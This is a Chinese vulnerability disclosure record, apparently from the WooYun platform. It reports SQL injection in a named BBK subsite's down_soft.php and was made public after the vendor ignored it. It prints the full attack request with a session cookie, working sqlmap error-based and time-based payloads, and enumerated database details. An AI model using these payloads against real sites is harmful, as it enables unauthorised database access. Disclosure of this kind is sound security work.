wybug_title: 步步高某分站存在SQL注入漏洞
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2016-07-03：	细节已通知厂商并且等待厂商处理中									2016-07-04：	厂商已经主动忽略漏洞，细节向公众公开  简要描述：  详细说明：  参数：Classid
POST /down_soft.php HTTP/1.1Content-Length: 62Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://www.bbktel.com.cn/Cookie: PHPSESSID=p4aemc1mbbva4efq19bruoesl1; Isz_sid=pOO2F5; Isz_onlineusernum=80; Isz_visitedfid=28D101; Isz_displaysearch_adv=1; discuz_collapse=_sidebar__category_5_Host: www.bbktel.com.cnConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*Classid=*&image=1&pro_number=1
   漏洞证明：  
sqlmap identified the following injection point(s) with a total of 2237 HTTP(s) requests:---Parameter: #1* ((custom) POST)    Type: error-based    Title: MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)    Payload: Classid=(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a6a7671,(SELECT (ELT(4231=4231,1))),0x7176626271,0x78))s), 8446744073709551610, 8446744073709551610)))&image=1&pro_number=1    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 time-based blind - Parameter replace    Payload: Classid=(CASE WHEN (8610=8610) THEN SLEEP(5) ELSE 8610 END)&image=1&pro_number=1---web application technology: Nginx, PHP 5.3.10back-end DBMS: MySQL >= 5.5sqlmap resumed the following injection point(s) from stored session:---Parameter: #1* ((custom) POST)    Type: error-based    Title: MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)    Payload: Classid=(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a6a7671,(SELECT (ELT(4231=4231,1))),0x7176626271,0x78))s), 8446744073709551610, 8446744073709551610)))&image=1&pro_number=1    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 time-based blind - Parameter replace    Payload: Classid=(CASE WHEN (8610=8610) THEN SLEEP(5) ELSE 8610 END)&image=1&pro_number=1---web application technology: Nginx, PHP 5.3.10back-end DBMS: MySQL >= 5.5current user:    'bbktel_www@localhost'current database:    'bbk_tel'current user is DBA:    Falsesqlmap resumed the following injection point(s) from stored session:---Parameter: #1* ((custom) POST)    Type: error-based    Title: MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)    Payload: Classid=(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a6a7671,(SELECT (ELT(4231=4231,1))),0x7176626271,0x78))s), 8446744073709551610, 8446744073709551610)))&image=1&pro_number=1    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 time-based blind - Parameter replace    Payload: Classid=(CASE WHEN (8610=8610) THEN SLEEP(5) ELSE 8610 END)&image=1&pro_number=1---web application technology: Nginx, PHP 5.3.10back-end DBMS: MySQL >= 5.5available databases [2]:[*] bbk_tel[*] information_schema

wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-07-04 09:07 厂商回复： 这个是vivo公司的网站，他们已经停止维护 最新状态： 暂无
